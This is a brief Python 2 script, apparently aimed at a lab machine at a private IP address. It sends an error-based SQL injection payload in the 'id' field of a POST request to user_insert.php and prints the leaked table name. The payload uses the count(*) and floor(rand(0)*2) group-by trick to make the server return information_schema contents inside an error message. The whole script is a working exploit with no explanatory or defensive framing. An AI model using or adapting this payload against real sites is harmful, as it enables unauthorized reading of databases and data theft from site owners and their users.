import httplib
import urllib

delims = "!~!~!"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

domain = "192.168.126.128"
url = "/user_insert.php"

table_name = "information_schema.tables where table_type='base table'"
column_name = "table_name"

params = "id=test\',(select x from(select count(*),concat('" + delims + "',(select " + column_name + " from " + table_name + " limit 1 offset 0), '" + delims + "',floor(rand(0)*2))x from information_schema.tables group by x)T))#&name=test"


conn = httplib.HTTPConnection(domain,"80")
#conn = httplib.HTTPSConnection(domain,"443")
conn.request("POST",url,params,headers)
response=conn.getresponse().read()

print response.split(delims)[1]